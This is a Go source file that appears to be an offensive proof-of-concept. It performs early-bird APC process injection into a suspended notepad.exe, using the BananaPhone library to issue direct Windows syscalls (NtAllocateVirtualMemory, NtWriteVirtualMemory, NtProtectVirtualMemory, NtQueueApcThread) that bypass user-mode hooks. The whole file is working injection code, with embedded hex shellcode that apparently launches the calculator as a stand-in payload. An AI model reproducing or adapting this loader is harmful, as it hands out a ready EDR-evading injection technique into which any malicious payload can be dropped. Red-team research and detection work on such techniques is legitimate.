package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
	"golang.org/x/sys/windows"
)

func setup() (uint16, uint16, uint16, uint16, uint16, uint16) {

	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if err != nil {
		log.Fatal(err)
	}
	// Couldn't get the params right on this one so just create a process with windows.CreateProcess
	// createUserProcess, err := bp.GetSysID("NtCreateUserProcess")
	// if err != nil {
	// 	log.Fatal(err)
	// }
	ntQueueApcThread, err := bp.GetSysID("NtQueueApcThread")
	if err != nil {
		log.Fatal(err)
	}
	protectVirtMemId, err := bp.GetSysID("NtProtectVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	writeVirtMem, err := bp.GetSysID("NtWriteVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	allocateVirtMem, err := bp.GetSysID("NtAllocateVirtualMemory")
	if err != nil {
		log.Fatal(err)
	}
	resumeThread, err := bp.GetSysID("NtResumeThread")
	if err != nil {
		log.Fatal(err)
	}
	closeHandle, err := bp.GetSysID("NtClose")
	if err != nil {
		log.Fatal(err)
	}

	return ntQueueApcThread, protectVirtMemId, writeVirtMem, allocateVirtMem, resumeThread, closeHandle
}

func inject(ntQueueApcThread uint16, ntProtectVirtualMemory uint16, ntWriteVirtualMemory uint16, ntAllocateVirtualMemory uint16,
	ntResumeThread uint16, ntClose uint16) {
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	si := &windows.StartupInfo{}
	pi := &windows.ProcessInformation{}
	pathName := "C:\\Windows\\System32\\notepad.exe"
	program, err := windows.UTF16PtrFromString(pathName)
	if err != nil {
		log.Fatal(err)
	}

	err = windows.CreateProcess(program, nil, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, si, pi)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Fatalf("[-] Failed to create process. Return code is %s\n", err.Error())
	}
	var bAddr uintptr
	regionSize := len(shellcode)

	// allocate memory to the process
	ret, err := bananaphone.Syscall(ntAllocateVirtualMemory,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&bAddr)),
		0,
		uintptr(unsafe.Pointer(&regionSize)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		log.Fatalf("[-] Failed to allocate memory. Return code is %x\n", ret)
		return
	}
	var numberOfBytesWritten uintptr
	// write memory to the process
	ret, err = bananaphone.Syscall(ntWriteVirtualMemory,
		uintptr(pi.Process),
		bAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(regionSize),
		uintptr(unsafe.Pointer(&numberOfBytesWritten)),
		0,
	)
	if err != nil {
		log.Fatalf("[-] Failed to write memory. Return code is %x\n", ret)
		return
	}
	// Change permissions
	var oldProtect uintptr
	ret, err = bananaphone.Syscall(ntProtectVirtualMemory,
		uintptr(pi.Process),
		uintptr(unsafe.Pointer(&bAddr)),
		uintptr(unsafe.Pointer(&regionSize)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if err != nil {
		log.Fatalf("[-] Failed to protect memory. Return code is %x\n", ret)
		return
	}

	// queue user apc then resume
	ret, err = bananaphone.Syscall(ntQueueApcThread,
		uintptr(pi.Thread),
		bAddr,
		bAddr,
		uintptr(0),
		0,
	)
	if err != nil {
		log.Fatalf("[-] Failed to queue thread. Return code is %x\n", ret)
		return
	}

	// Sometimes errors, sometime doesn't. Don't know why. Shellcode will always run but program will panic
	ret, err = bananaphone.Syscall(ntResumeThread,
		uintptr(pi.Thread),
		0,
	)
	if err != nil {
		log.Fatalf("[-] Failed to resume thread. Return code is %x\n", ret)
		return
	}
	// close handles
	err = windows.CloseHandle(pi.Process)
	if err != nil {
		log.Fatalf("[-] Failed to close handle to process. Return error %x\n", err.Error())
		return
	}
	err = windows.CloseHandle(pi.Thread)
	if err != nil {
		log.Fatalf("[-] Failed to close handle to process. Return error %s\n", err.Error())
	}

	// ntClose issues. Not sure why
	// ret, err = bananaphone.Syscall(ntClose,
	// 	uintptr(pi.Process),
	// )
	// if err != nil {
	// 	log.Fatalf("[-] Failed to close handle to process. Return code is %x\n", ret)
	// 	return
	// }

	// ret, err = bananaphone.Syscall(ntClose,
	// 	uintptr(pi.Thread),
	// )
	// if err != nil {
	// 	log.Fatalf("[-] Failed to close handle to thread. Return code is %x\n", ret)
	// 	return
	// }
}

func main() {
	inject(setup())
}
